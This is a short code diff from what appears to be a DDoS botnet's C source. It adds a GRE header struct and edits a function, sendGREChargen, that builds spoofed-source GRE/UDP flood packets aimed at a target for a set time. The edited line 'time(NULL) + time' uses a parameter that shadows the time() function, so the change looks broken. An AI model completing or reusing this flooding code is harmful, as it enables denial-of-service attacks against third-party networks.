@@ -69,7 +69,10 @@ unsigned char macAddress[6] = {0};
 
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
-
+struct grehdr {
+    uint16_t flags;
+    uint16_t protocol;
+};
 void init_rand(uint32_t x)
 {
         int i;
@@ -723,7 +726,7 @@ void sendGREChargen(unsigned char *target, int port, int time, int spoofed, int 
     in_addr_t netmask = (spoofed == 0) ? ~((in_addr_t)0) : ~( (1 << (32 - spoofed)) - 1 );
 
     int pollRegister = pollinterval;
-    int end = time(NULL) + duration;
+    int end = time(NULL) + time;
     unsigned int i = 0;
 
     unsigned char packet[sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
